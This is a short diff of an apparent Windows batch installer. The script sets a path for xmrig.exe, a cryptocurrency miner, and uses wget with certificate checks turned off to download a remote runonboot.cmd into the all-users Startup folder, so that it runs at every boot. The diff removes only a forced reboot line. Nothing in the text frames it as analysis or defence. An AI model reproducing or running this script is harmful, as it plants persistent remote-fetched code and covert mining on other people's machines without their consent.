@@ -3,6 +3,5 @@ setx wget "C:\Users\Public\wget.exe"
 setx startup "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 C:\Users\Public\wget.exe -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/runonboot.cmd --no-check-certificate -O "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runonboot.cmd"
 setx xmrig "%TMP%\xmrig.exe"
-shutdown /r /t 10
 cls
 exit
